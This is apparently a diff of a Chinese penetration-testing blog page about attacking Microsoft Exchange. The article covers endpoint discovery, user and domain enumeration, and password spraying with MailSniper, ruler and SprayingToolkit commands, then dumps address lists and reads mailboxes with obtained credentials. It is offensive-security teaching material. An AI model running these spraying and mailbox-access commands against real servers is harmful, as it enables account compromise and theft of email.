@@ -1,4 +1,21 @@
-<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -68,7 +85,7 @@
     back2top_sidebar: false,
     fancybox: true,
     fastclick: true,
-    lazyload: true,
+    lazyload: false,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     algolia: {
@@ -92,33 +109,33 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="Exchange在渗透测试中的利用">
 <meta property="og:url" content="https://evi1cg.github.io/archives/Exchange_Hack.html">
-<meta property="og:site_name" content="Evi1cg's blog">
+<meta property="og:site_name" content="Evi1cg&#39;s blog">
 <meta property="og:description" content="0x00 Exchange简介Windows Exchange Server，是国内外应用非常广泛的邮件服务器，是微软公司的一套电子邮件服务组件。 简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。所以通常渗透测试过程中也会对其进行攻击尝试。 0x01  Exchange Endpoint通常Exchange Server 有以下endpoint，即可访问的连接如下">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
-<meta property="og:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010879627.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010888182.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010869955.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010857355.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010831575.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010837872.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010962270.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010924029.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010982186.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010993800.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010925301.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010998743.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010951921.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010921519.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010976996.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010993350.jpg">
+<meta property="og:image" content="https://evi1cg.github.io/usr/uploads/2019/01/2965525239.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010940263.jpg">
+<meta property="og:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010993399.jpg">
 <meta property="og:updated_time" content="2019-01-23T02:14:20.802Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Exchange在渗透测试中的利用">
 <meta name="twitter:description" content="0x00 Exchange简介Windows Exchange Server，是国内外应用非常广泛的邮件服务器，是微软公司的一套电子邮件服务组件。 简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。所以通常渗透测试过程中也会对其进行攻击尝试。 0x01  Exchange Endpoint通常Exchange Server 有以下endpoint，即可访问的连接如下">
-<meta name="twitter:image" content="https://evi1cg.github.io/images/loading.svg">
+<meta name="twitter:image" content="https://evi1cg.github.io//usr/uploads/2019/01/2019010879627.jpg">
 
 
 
@@ -498,8 +515,8 @@
       
 
       
-        <meta name="generator" content="Hexo 3.9.0"><h2 id="0x00-Exchange简介"><a href="#0x00-Exchange简介" class="headerlink" title="0x00 Exchange简介"></a>0x00 Exchange简介</h2><p>Windows Exchange Server，是国内外应用非常广泛的邮件服务器，是微软公司的一套电子邮件服务组件。 简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。所以通常渗透测试过程中也会对其进行攻击尝试。</p>
-<h2 id="0x01-Exchange-Endpoint"><a href="#0x01-Exchange-Endpoint" class="headerlink" title="0x01  Exchange Endpoint"></a>0x01  Exchange Endpoint</h2><p>通常Exchange Server 有以下endpoint，即可访问的连接如下：<br></p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/AutoDiscover/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/Ecp/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/EWS/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/mapi/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/Microsoft-Server-ActiveSync/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/OAB/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/OWA/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/PowerShell/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/Rpc/</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+        <h2 id="0x00-Exchange简介"><a href="#0x00-Exchange简介" class="headerlink" title="0x00 Exchange简介"></a>0x00 Exchange简介</h2><p>Windows Exchange Server，是国内外应用非常广泛的邮件服务器，是微软公司的一套电子邮件服务组件。 简单而言，Exchange server可以被用来构架应用于企业、学校的邮件系统。所以通常渗透测试过程中也会对其进行攻击尝试。</p>
+<h2 id="0x01-Exchange-Endpoint"><a href="#0x01-Exchange-Endpoint" class="headerlink" title="0x01  Exchange Endpoint"></a>0x01  Exchange Endpoint</h2><p>通常Exchange Server 有以下endpoint，即可访问的连接如下：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/AutoDiscover/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/Ecp/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/EWS/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/mapi/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/Microsoft-Server-ActiveSync/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/OAB/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/OWA/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/PowerShell/</span></span><br><span class="line">https:<span class="regexp">//</span>Exchangeserver<span class="regexp">/Rpc/</span></span><br></pre></td></tr></table></figure></p>
 <p>每个endpoint的作用如下：</p>
 <table>
 <thead>
@@ -548,82 +565,82 @@
 </tbody>
 </table>
 <p>以上endpoint中，常用于暴力破解的有/owa 、/ews、/Microsoft-Server-ActiveSync 及/autodiscover，如owa的暴力破解（passwordspray）：<br>抓取登录包如下：</p>
-<p></p><div class="progress-images" style="width:2236px"><div class="progress-images--placeholder" style="padding-bottom: 39.62432915921288%;"></div><img src="/images/loading.svg" alt="-w1118" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010879627.jpg" data-thumb="/images/thumb/148144e4a5e64c7b42622e84bd2589cd.jpg"></div><p></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010879627.jpg" alt="-w1118"></p>
 <blockquote>
 <p>用户名可尝试使用domain\username、domian.com\username、username</p>
 </blockquote>
 <p>使用某密码进行暴力破解：</p>
-<p></p><div class="progress-images" style="width:1440px"><div class="progress-images--placeholder" style="padding-bottom: 67.08333333333333%;"></div><img src="/images/loading.svg" alt="-w720" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010888182.jpg" data-thumb="/images/thumb/2b9d382e0d6c9dbe4515378753a30c20.jpg"></div><p></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010888182.jpg" alt="-w720"></p>
 <p><code>/Microsoft-Server-ActiveSync</code> 爆破为401认证，需要对用户账号密码进行base64处理:</p>
-<p></p><div class="progress-images" style="width:1294px"><div class="progress-images--placeholder" style="padding-bottom: 47.60432766615147%;"></div><img src="/images/loading.svg" alt="-w647" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010869955.jpg" data-thumb="/images/thumb/3ea0d5e4870022e3204b77b9873c1601.jpg"></div><p></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010869955.jpg" alt="-w647"></p>
 <blockquote>
-<p><code>YWRtaW46YWRtaW4=</code>  -> <code>admin:admin</code></p>
+<p><code>YWRtaW46YWRtaW4=</code>  -&gt; <code>admin:admin</code></p>
 </blockquote>
 <p><code>/ews</code>、<code>/rpc</code> 等几个endpoint同样为401认证，账号密码的加密方式为NTLM Authenticate：</p>
-<p></p><div class="progress-images" style="width:2528px"><div class="progress-images--placeholder" style="padding-bottom: 22.54746835443038%;"></div><img src="/images/loading.svg" alt="-w1264" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010857355.jpg" data-thumb="/images/thumb/3d68a3115a298343a1b6fff38e0e93aa.jpg"></div><p></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010857355.jpg" alt="-w1264"></p>
 <p>爆破需对账号密码进行处理之后在进行。</p>
 <h2 id="0x02-Get-UserList"><a href="#0x02-Get-UserList" class="headerlink" title="0x02 Get UserList"></a>0x02 Get UserList</h2><h3 id="验证Exchange"><a href="#验证Exchange" class="headerlink" title="验证Exchange"></a>验证Exchange</h3><p>对Exchange的利用首先要确定其是否使用了exchange，关于判断的方式，我知道的方式有:<br>1、<a href="https://github.com/vysec/checkO365" target="_blank" rel="noopener">checkO365</a></p>
-<p></p><div class="progress-images" style="width:1364px"><div class="progress-images--placeholder" style="padding-bottom: 28.73900293255132%;"></div><img src="/images/loading.svg" alt="-w682" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010831575.jpg" data-thumb="/images/thumb/7d1af2718d551ed4754d48f953a8392f.jpg"></div><p></p>
-<p>2、owa 登录页面，如：<br></p><div class="progress-images" style="width:1323px"><div class="progress-images--placeholder" style="padding-bottom: 43.08390022675737%;"></div><img src="/images/loading.svg" alt="" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010837872.jpg" data-thumb="/images/thumb/ccb533738c3601a3c3a811cd33f95211.jpg"></div><p></p>
-<p>3、特殊域名：<br>访问如下域名<br></p><figure class="highlight dts"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//autodiscover.domain.com/autodiscover/autodiscover.xml</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//owa.domian/owa/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//mail.domain.com/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//webmail.domain.com/</span></span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010831575.jpg" alt="-w682"></p>
+<p>2、owa 登录页面，如：<br><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010837872.jpg" alt=""></p>
+<p>3、特殊域名：<br>访问如下域名<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//autodiscover.domain.com/autodiscover/autodiscover.xml</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//owa.domian/owa/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//mail.domain.com/</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//webmail.domain.com/</span></span><br></pre></td></tr></table></figure></p>
 <h3 id="获取用户列表"><a href="#获取用户列表" class="headerlink" title="获取用户列表"></a>获取用户列表</h3><p>之后我们需要获取其至少一个账号的信息，那么就需要取搜集获取某域的用户列表，除了top username进行爆破，还可以使用<a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">theharvester</a>、<a href="https://github.com/Ridter/Mailget" target="_blank" rel="noopener">Mailget</a>等工具进行搜集，另外还有一种通过延时来判断的方式。在<a href="https://github.com/dafthack/MailSniper" target="_blank" rel="noopener">MailSniper</a> 写了这样几种来判断内部域和存在用户的方法：</p>
 <ul>
 <li>Invoke-DomainHarvest</li>
 <li>Invoke-UsernameHarvestOWA</li>
 <li>Invoke-UsernameHarvestEAS</li>
 </ul>
-<p>首先来看Invoke-DomainHarvest，这里通过了几种方式来获取内部域名，构造参数如下：<br></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Invoke-DomainHarvestOWA</span> <span class="selector-tag">-ExchHostname</span> <span class="selector-tag">domian</span><span class="selector-class">.com</span></span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>脚本会构造如下url:<br></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$OWAURL</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/owa/auth.owa"</span>)</span><br><span class="line"><span class="variable">$OWAURL2</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/owa/"</span>)</span><br><span class="line"><span class="variable">$autodiscoverurl</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/autodiscover/autodiscover.xml"</span>)</span><br><span class="line"><span class="variable">$ewsurl</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/EWS/Exchange.asmx"</span>)</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>首先来看Invoke-DomainHarvest，这里通过了几种方式来获取内部域名，构造参数如下：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Invoke-DomainHarvestOWA</span> <span class="selector-tag">-ExchHostname</span> <span class="selector-tag">domian</span><span class="selector-class">.com</span></span><br></pre></td></tr></table></figure></p>
+<p>脚本会构造如下url:<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$OWAURL</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/owa/auth.owa"</span>)</span><br><span class="line"><span class="variable">$OWAURL2</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/owa/"</span>)</span><br><span class="line"><span class="variable">$autodiscoverurl</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/autodiscover/autodiscover.xml"</span>)</span><br><span class="line"><span class="variable">$ewsurl</span> = (<span class="string">"https://"</span> + <span class="variable">$ExchHostname</span> + <span class="string">"/EWS/Exchange.asmx"</span>)</span><br></pre></td></tr></table></figure></p>
 <p>在未指定<code>brute</code>的情况下，脚本会先请求<code>autodiscoverurl</code>,若失败，再请求ewsurl，并通过请求头里面的NTLM Authenticate数据来猜测内部域名，如：</p>
-<p></p><div class="progress-images" style="width:2552px"><div class="progress-images--placeholder" style="padding-bottom: 28.761755485893417%;"></div><img src="/images/loading.svg" alt="-w1276" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010962270.jpg" data-thumb="/images/thumb/aa0011f8f07ab5a86e04a32962c2faf9.jpg"></div><p></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010962270.jpg" alt="-w1276"></p>
 <blockquote>
 <p>需要注意到是，未指定brute的时候需要更改-ExchHostname 为对应的autodiscoverurl及ewsurl</p>
 </blockquote>
-<p>指定brute的情况下，则会使用通过时间延迟的方式来检测域名是否存在，首先会构造一些不存在的域及用户名请求owa，并记录其响应时间，之后使用构造的域字典及随机用户名来请求owa，根据其响应时间的不同来判断域及用户名，在这里有两种brute方式，第一种通过导入域名列表：<br></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt -brute</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>第二种通过公司名称来猜测：<br></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -CompanyName <span class="string">"bla bla"</span> -OutFile potentially-valid-domains.txt -brute</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p>获取域名之后，可导入用户名进行用户名存在检测：<br></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads <span class="number">1</span> -OutFile owa-valid-users.txt</span><br><span class="line">Invoke-UsernameHarvestEAS -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads <span class="number">1</span> -OutFile eas-valid-users.txt</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>指定brute的情况下，则会使用通过时间延迟的方式来检测域名是否存在，首先会构造一些不存在的域及用户名请求owa，并记录其响应时间，之后使用构造的域字典及随机用户名来请求owa，根据其响应时间的不同来判断域及用户名，在这里有两种brute方式，第一种通过导入域名列表：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt -brute</span><br></pre></td></tr></table></figure></p>
+<p>第二种通过公司名称来猜测：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -CompanyName <span class="string">"bla bla"</span> -OutFile potentially-valid-domains.txt -brute</span><br></pre></td></tr></table></figure></p>
+<p>获取域名之后，可导入用户名进行用户名存在检测：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads <span class="number">1</span> -OutFile owa-valid-users.txt</span><br><span class="line">Invoke-UsernameHarvestEAS -ExchHostname mail.domain.com -Domain domainname -UserList .\userlist.txt -Threads <span class="number">1</span> -OutFile eas-valid-users.txt</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>PS : 作者说这个问题提交给微软以后并没有修复，但是实际测试效果并不好，但是没准碰到可以使用的情况也说不定。</p>
 </blockquote>
-<p>当获取到一个用户的账号密码之后，可以通过<code>Get-GlobalAddressList</code>来获取GlobalAddress的用户邮箱地址：<br></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-GlobalAddressList -ExchHostname owaurl -UserName username -Password password</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:2260px"><div class="progress-images--placeholder" style="padding-bottom: 32.47787610619469%;"></div><img src="/images/loading.svg" alt="-w1130" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010924029.jpg" data-thumb="/images/thumb/0672b56b819a213a621e80eb8efffb90.jpg"></div><p></p>
+<p>当获取到一个用户的账号密码之后，可以通过<code>Get-GlobalAddressList</code>来获取GlobalAddress的用户邮箱地址：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-GlobalAddressList -ExchHostname owaurl -UserName username -Password password</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010924029.jpg" alt="-w1130"></p>
 <h2 id="0x03-Brute-Force"><a href="#0x03-Brute-Force" class="headerlink" title="0x03 Brute Force"></a>0x03 Brute Force</h2><p>在这里暴力破解的地方有很多个，首先可以通过burpsuite对OWA进行暴力破解，另外就是<code>/autodiscover</code>、<code>/ews</code>、<code>/Microsoft-Server-ActiveSync</code> 等几个endpoint，可利用的工具如：<a href="https://github.com/dafthack/MailSniper" target="_blank" rel="noopener">MailSniper</a>、<a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">Ruler</a>、<a href="https://github.com/byt3bl33d3r/SprayingToolkit" target="_blank" rel="noopener">SprayingToolkit</a>，可根据个人喜好取舍。为了防止账号因多次登陆失败触发告警或账户被封禁，建议使用同密码爆破用户名的方式进行暴力破解。下面介绍一下MailSniper的相关方法的使用。</p>
 <p><strong>通过owa爆破：</strong></p>
-<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\MailSniper.ps1</span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname OWAHOST -UserList .\user.txt -Password password -Threads <span class="number">1</span> -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></tbody></table></figure>
-<p></p><div class="progress-images" style="width:1920px"><div class="progress-images--placeholder" style="padding-bottom: 17.395833333333332%;"></div><img src="/images/loading.svg" alt="-w960" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010982186.jpg" data-thumb="/images/thumb/fd6a12a3c1dae7a6eddd95ab320065d5.jpg"></div><p></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\MailSniper.ps1</span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname OWAHOST -UserList .\user.txt -Password password -Threads <span class="number">1</span> -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></table></figure>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010982186.jpg" alt="-w960"></p>
 <p><strong>通过ews爆破：</strong></p>
-<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayEWS -ExchHostname EWSHOST -UserList .\user.txt -Password password -Threads <span class="number">1</span> -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></tbody></table></figure>
-<p></p><div class="progress-images" style="width:1928px"><div class="progress-images--placeholder" style="padding-bottom: 16.286307053941908%;"></div><img src="/images/loading.svg" alt="-w964" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010993800.jpg" data-thumb="/images/thumb/69a47d16a8503c4a5b0c70755e197837.jpg"></div><p></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayEWS -ExchHostname EWSHOST -UserList .\user.txt -Password password -Threads <span class="number">1</span> -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></table></figure>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010993800.jpg" alt="-w964"></p>
 <p><strong>通过Microsoft-Server-ActiveSync爆破：</strong></p>
-<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayEAS -ExchHostname MSAHOST -UserList .\user.txt -Password password -Threads <span class="number">1</span> -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></tbody></table></figure>
-<p></p><div class="progress-images" style="width:1796px"><div class="progress-images--placeholder" style="padding-bottom: 16.815144766146993%;"></div><img src="/images/loading.svg" alt="-w898" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010925301.jpg" data-thumb="/images/thumb/cafc22b595d6f44b90834cabe687df9d.jpg"></div><p></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PasswordSprayEAS -ExchHostname MSAHOST -UserList .\user.txt -Password password -Threads <span class="number">1</span> -Domain domainname -OutFile out.txt -Verbose</span><br></pre></td></tr></table></figure>
+<p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010925301.jpg" alt="-w898"></p>
 <p><strong>通过autodiscover 爆破：</strong><br>在MailSniper中没有写对autodiscover的爆破，可以选择使用burp、ruler或者SprayingToolkit。</p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python atomizer.py owa autodiscoverhost password user.txt</span><br></pre></td></tr></tbody></table></figure>
-<p></p><div class="progress-images" style="width:1494px"><div class="progress-images--placeholder" style="padding-bottom: 28.380187416331996%;"></div><img src="/images/loading.svg" alt="-w747" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010998743.jpg" data-thumb="/images/thumb/2d6d93d8f729e15283db9217f77bc2cb.jpg"></div><p></p>
-<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ruler --domain autodiscoverhost -k brute --users user.txt --passwords pass.txt --delay 0 --threads 10 -v</span><br></pre></td></tr></tbody></table></figure>
-<p></p><div class="progress-images" style="width:1754px"><div class="progress-images--placeholder" style="padding-bottom: 19.27023945267959%;"></div><img src="/images/loading.svg" alt="-w877" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010951921.jpg" data-thumb="/images/thumb/028069d5e741d8b23c4ff00dac0fd217.jpg"></div><p></p>
-<h2 id="0x04-Search-mail"><a href="#0x04-Search-mail" class="headerlink" title="0x04 Search mail"></a>0x04 Search mail</h2><p>在获取到某用户邮箱账号密码以后，我们可以对其邮件内容进行搜索，除了直接登录邮件外，也可以使用Exchange的接口进行邮件的检索，其接口的相关开发可以参考《<a href="https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS" target="_blank" rel="noopener">Exchange Web Service(EWS)开发指南</a>%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/)》，在外网情况下，可使用此工具来列出邮件内容。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewshost/ews/Exchange.asmx -Mode ListMail -Folder Inbox</span><br></pre></td></tr></tbody></table></figure><p></p>
-<p></p><div class="progress-images" style="width:1918px"><div class="progress-images--placeholder" style="padding-bottom: 44.94264859228363%;"></div><img src="/images/loading.svg" alt="-w959" class="progress-images--original" data-original="https://evi1cg.github.io//usr/uploads/2019/01/2019010921519.jpg" data-thumb="/images/thumb/ae10ffc74521c7dd3ff1c8293f1d520c.jpg"></div><p></p>
